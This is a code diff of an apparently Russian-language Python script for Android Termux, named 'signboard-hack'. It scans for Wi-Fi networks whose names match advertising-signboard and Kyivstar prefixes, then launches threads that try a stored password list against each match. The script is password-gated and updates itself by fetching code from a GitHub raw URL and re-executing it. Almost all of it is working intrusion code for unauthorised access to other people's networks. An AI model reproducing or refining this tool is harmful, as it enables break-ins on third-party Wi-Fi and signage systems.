@@ -8,9 +8,9 @@ import requests
 import re
 from threading import Thread
 import getpass
-import shutil
+from urllib.parse import quote
 
-# ===== ОБНОВЛЕННАЯ КОНФИГУРАЦИЯ =====
+# ===== КОНФИГУРАЦИЯ =====
 TARGET_PREFIXES = [
     # Основные префиксы вывесок
     "A5L", "A6L", "B6L", "H4K", "H8", "H6", "B8L", "A7", "A8", "A3",
@@ -52,10 +52,8 @@ TARGET_PREFIXES = [
     "LCD", "LED", "SMD", "RGB", "OLED", "QLED", "DISP", "SCRN", "BRD", "SIGN",
     "ADV", "ADS", "PUB", "OUT", "IN", "SHOP", "STORE", "MALL", "HOTEL", "CAFE",
     
-    # Префиксы для тестирования - расширенный список
-    "Kyivstar", "KyivStar", "KYIVSTAR", "kyivstar",
-    "KYIV", "Kievstar", "Kiyvstar",  # Возможные опечатки
-    "Kyivstar_CC"  # Часть вашего SSID
+    # Префиксы для тестирования
+    "Kyivstar", "KyivStar", "KYIVSTAR", "Kyivstar_CC"  # Добавлено для тестирования
 ]
 
 PASSWORD_LIST = [
@@ -65,11 +63,10 @@ PASSWORD_LIST = [
 SCAN_INTERVAL = 15  # Быстрое сканирование
 PASSWORD = "k33rooxx"
 REPO_URL = "https://raw.githubusercontent.com/keerooxx/signboard-hack/main/scanner.py"
-VERSION = "1.6"  # Новая версия
 # ========================
 
-def print_banner():
-    """Обновленный баннер с новым названием"""
+def print_keerooxx():
+    """Печатаем красивый ASCII-арт для keerooxx"""
     print(r"""
  ██ ▄█▀▓█████  ██▀███   ▒█████  ▒██   ██▒
  ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░
@@ -81,8 +78,6 @@ def print_banner():
 ░ ░░ ░    ░     ░░   ░ ░ ░ ░ ▒   ░    ░  
 ░  ░      ░  ░   ░         ░ ░   ░    ░  
     """)
-    print(f"Wi-Fi Scanner Tool | by @krx1krx | v{VERSION}")
-    print("="*45)
 
 def auto_update():
     """Автоматическое обновление скрипта с авто-перезапуском"""
@@ -107,7 +102,7 @@ def auto_update():
         print("[✓] Скрипт успешно обновлен!")
         print("[~] Перезапускаю скрипт...")
         
-        # Автоматический перезапуск С БЕЗ ФЛАГА ОБНОВЛЕНИЯ
+        # Автоматический перезапуск
         os.execv(sys.executable, [sys.executable] + sys.argv)
         return True
         
@@ -129,62 +124,32 @@ def check_password():
     return user_input.strip() == PASSWORD
 
 def is_target_network(ssid):
-    """Улучшенная проверка префиксов с поддержкой частичного совпадения"""
-    if not ssid:
-        return False
-        
-    # Приводим SSID к нижнему регистру для унификации
-    ssid_lower = ssid.lower()
-    
+    """Улучшенная проверка префиксов"""
     # Проверяем форматы вида WXX_XXXX
-    if re.match(r"^w\d{2}_", ssid_lower):
+    if re.match(r"^W\d{2}_", ssid):
         return True
     
-    # Проверяем все префиксы (частичное совпадение в любом месте SSID)
-    for prefix in TARGET_PREFIXES:
-        # Приводим префикс к нижнему регистру
-        prefix_lower = prefix.lower()
-        
-        # Проверяем разные варианты совпадений
-        if (
-            ssid_lower.startswith(prefix_lower) or  # Начало SSID
-            prefix_lower in ssid_lower or           # Любая часть SSID
-            ssid_lower == prefix_lower              # Полное совпадение
-        ):
-            return True
-    
-    return False
+    # Проверяем обычные префиксы
+    return any(ssid.startswith(prefix) for prefix in TARGET_PREFIXES)
 
 def try_connect(ssid, password):
-    """Попытка подключения через Termux API"""
+    """Попытка подключения через Intent (без root)"""
     try:
-        # Проверяем наличие termux-wifi-connect
-        if not shutil.which("termux-wifi-connect"):
-            print("    [!] Termux:API не установлен!")
-            print("    [!] Установите: pkg install termux-api")
-            print("    [!] И скачайте приложение Termux:API из Play Store")
-            return False
-            
+        # Кодируем спецсимволы в SSID
+        encoded_ssid = quote(ssid, safe='')
+        
         result = subprocess.run(
-            ["termux-wifi-connect", "-s", ssid, "-p", password],
+            ["am", "start", "-a", "android.intent.action.VIEW", 
+             "-d", f"wifi://{encoded_ssid}/{password}"],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True,
-            timeout=20  # Увеличили таймаут для подключения
+            timeout=10
         )
         
         # Проверяем успешность выполнения команды
-        if result.returncode == 0:
-            print("    [✓] Подключение инициировано через Termux API")
-            return True
-            
-        # Выводим ошибку, если есть
-        if result.stderr:
-            print(f"    [!] Ошибка подключения: {result.stderr.strip()}")
-            
-        return False
-    except Exception as e:
-        print(f"    [!] Ошибка подключения: {e}")
+        return result.returncode == 0
+    except:
         return False
 
 def test_password(ssid, password):
@@ -215,21 +180,9 @@ def hack_network(ssid):
     else:
         print("\n[✗] Не удалось подключиться")
 
-def scan_wifi_networks():
-    """Надежное сканирование Wi-Fi сетей с использованием Termux API"""
+def fast_scan_wifi():
+    """Быстрое сканирование Wi-Fi сетей"""
     try:
-        # Инициируем сканирование
-        subprocess.run(
-            ["termux-wifi-scan"],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            timeout=10
-        )
-        
-        # Даем время на сканирование
-        time.sleep(3)
-        
-        # Получаем результаты
         result = subprocess.check_output(
             ["termux-wifi-scaninfo"],
             text=True,
@@ -249,71 +202,16 @@ def parse_networks(scan_result):
     except:
         return []
 
-def check_termux_api_installed():
-    """Проверка установки Termux API с диагностикой"""
-    required_commands = ["termux-wifi-scan", "termux-wifi-scaninfo", "termux-wifi-connect"]
-    missing = []
-    found = []
-    
-    print("\n[~] Диагностика Termux API:")
-    
-    for cmd in required_commands:
-        path = shutil.which(cmd)
-        if path:
-            print(f"    [✓] {cmd}: найдено в {path}")
-            found.append(cmd)
-        else:
-            print(f"    [✗] {cmd}: не найдено")
-            missing.append(cmd)
-    
-    if not missing:
-        print("[✓] Все необходимые команды найдены")
-        return True
-    
-    print("\n[!] Проблемы обнаружены:")
-    print("    1. Убедитесь, что установлен пакет termux-api:")
-    print("       pkg install termux-api")
-    print("    2. Убедитесь, что установлено приложение Termux:API")
-    print("    3. Проверьте разрешения для Termux:API в настройках Android")
-    print("    4. Перезапустите Termux после установки")
-    
-    # Проверка наличия пакета в системе
-    try:
-        print("\n[~] Проверка установки пакета termux-api...")
-        result = subprocess.run(
-            ["pkg", "show", "termux-api"],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            timeout=5
-        )
-        if "installed: yes" in result.stdout:
-            print("    [✓] Пакет termux-api установлен")
-        else:
-            print("    [✗] Пакет termux-api не установлен")
-    except:
-        print("    [!] Не удалось проверить статус пакета")
-    
-    return False
-
 def main():
-    # ТОЛЬКО ПЕРВЫЙ ЗАПУСК: проверка обновлений
-    if "--no-update" not in sys.argv and "--restarted" not in sys.argv:
-        if auto_update():
-            return  # Выход после обновления
+    # Автоматическое обновление при запуске
+    if "--no-update" not in sys.argv:
+        auto_update()
     
-    # Если скрипт был перезапущен после обновления, добавляем флаг
-    if "--restarted" not in sys.argv:
-        sys.argv.append("--restarted")
-    
-    # Печатаем обновленный баннер
-    print_banner()
-    
-    # Проверка зависимостей с диагностикой
-    if not check_termux_api_installed():
-        print("\n[!] Критические ошибки: Termux API не установлен или не настроен правильно")
-        print("[!] Скрипт не может работать без Termux API")
-        return
+    # Печатаем логотип
+    print_keerooxx()
+    print("Wi-Fi Scanner Tool | Termux Edition")
+    print("Telegram: @krx1krx")
+    print("======================================")
     
     # Проверка пароля
     if not check_password():
@@ -350,7 +248,7 @@ def main():
     try:
         while True:
             # Ускоренное сканирование
-            scan_result = scan_wifi_networks()
+            scan_result = fast_scan_wifi()
             
             if scan_result:
                 networks = parse_networks(scan_result)
@@ -358,22 +256,22 @@ def main():
                 
                 print(f"\n[~] Сканирование завершено. Сетей: {len(unique_networks)}")
                 
-                # Временная диагностика: выводим все сети
+                # Отображаем первые 5 сетей для тестирования
+                if unique_networks:
+                    print(f"[i] Обнаружены сети: {', '.join(unique_networks[:5])}" + 
+                          ("..." if len(unique_networks) > 5 else ""))
+                
+                # ДИАГНОСТИКА: выводим все сети и результат проверки
                 print("\n[DEBUG] Все обнаруженные сети:")
                 for i, ssid in enumerate(unique_networks):
                     target = "ДА" if is_target_network(ssid) else "НЕТ"
                     print(f"  {i+1}. {ssid} (Целевая: {target})")
                 
-                found_targets = False
                 for ssid in unique_networks:
                     if ssid and is_target_network(ssid):
-                        found_targets = True
                         print(f"[+] Обнаружена целевая сеть: {ssid}")
                         # Запускаем проверку паролей в отдельном потоке
                         Thread(target=hack_network, args=(ssid,), daemon=True).start()
-                
-                if not found_targets:
-                    print("[i] Целевые сети не обнаружены")
             
             # Ожидание до следующего сканирования
             sleep_time = SCAN_INTERVAL - (time.time() - last_scan)
@@ -387,4 +285,7 @@ def main():
         print(f"[!] Критическая ошибка: {e}")
 
 if __name__ == "__main__":
+    # Проверка разрешений
+    print("[~] Запрос необходимых разрешений...")
+    subprocess.run(["termux-setup-storage"], stdout=subprocess.DEVNULL, timeout=5)
     main()
